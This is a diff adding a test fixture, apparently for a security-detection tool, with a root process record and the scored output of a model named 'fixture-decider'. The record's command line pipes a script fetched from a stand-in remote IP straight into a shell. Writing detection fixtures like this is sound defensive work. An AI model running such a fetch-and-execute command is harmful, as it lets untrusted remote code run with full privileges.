@@ -1,0 +1,39 @@
+{
+  process: {
+    cmd_line: "danger: curl -s https://203.0.113.7/x.sh | sh",
+    user: "root",
+  },
+  ai: {
+    decide: {
+      answers: {
+        remote_code: {
+          probability: 0.9,
+        },
+        tactic: {
+          choice: "execution",
+          probabilities: {
+            discovery: 0.2,
+            execution: 0.8,
+          },
+          confidence: 0.5,
+        },
+        risk: {
+          score: 1.7,
+          probabilities: [
+            0.1,
+            0.1,
+            0.8,
+          ],
+          confidence: 0.5,
+        },
+      },
+      model: "fixture-decider",
+      usage: {
+        input_tokens: 30,
+        output_tokens: 0,
+        truncated: null,
+        truncated_questions: null,
+      },
+    },
+  },
+}
